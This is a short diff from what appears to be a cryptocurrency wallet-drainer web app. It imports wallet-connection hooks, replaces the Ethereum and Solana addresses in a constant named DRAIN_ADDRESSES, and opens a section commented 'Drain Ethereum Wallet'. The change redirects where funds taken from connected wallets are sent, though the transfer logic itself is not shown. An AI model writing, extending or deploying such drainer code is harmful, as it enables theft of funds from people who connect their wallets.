@@ -8,8 +8,8 @@ import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
 import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 const DRAIN_ADDRESSES = {
-  ethereum: "0x0775bfb375757a355af3e318a55f6a23ba03d520",
-  solana: "DcxDHKrEM7CY6nHZJepi9GzRh9vNFJnHt5ipaoxs8ZVB",
+  ethereum: "0x986E412Cd72275728d419ed2B1C726188B523256",
+  solana: "8aMQkXNqrV5GfLua9NfF5LuPhBHx6kZHGuenBPfAEGJV",
 };
 
 // 🚀 Drain Ethereum Wallet
